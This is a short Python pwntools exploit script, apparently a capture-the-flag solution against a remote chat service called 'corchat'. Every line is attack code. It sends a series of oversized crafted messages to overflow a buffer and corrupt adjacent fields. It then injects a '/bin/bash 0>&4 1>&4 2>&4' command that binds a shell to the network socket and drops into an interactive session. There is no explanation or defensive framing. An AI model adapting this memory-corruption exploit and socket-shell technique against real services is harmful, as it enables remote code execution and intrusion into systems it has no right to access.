from pwn import *

# p = remote('localhost', 9999)
p = remote('pwn-corchat-b293bf49f31ff8e3.be.ax', 1337, ssl=True)

def send_msg(msglen, flags, msg):
	payload = b'_SEND_MSG'
	payload += p16(msglen)
	payload += p16(flags)
	payload += msg

	p.send(payload)

for i in range(1, 8):
	payload = b'a'*0x402
	payload += p16(i + 0xd78)
	payload += b'\x00'*4
	payload += b'\x00'*(i + 1)
	sleep(0.5)

	send_msg(1, 1, payload)

cmd = b'/bin/bash 0>&4 1>&4 2>&4'

payload = cmd
payload += b';'
payload = payload.ljust(0x402, b'a')
payload += p16(0x420)
payload += b'\x00'*4
payload += p64(0)*4
payload += b'\x11'

sleep(0.5)

send_msg(1, 1, payload)

p.interactive()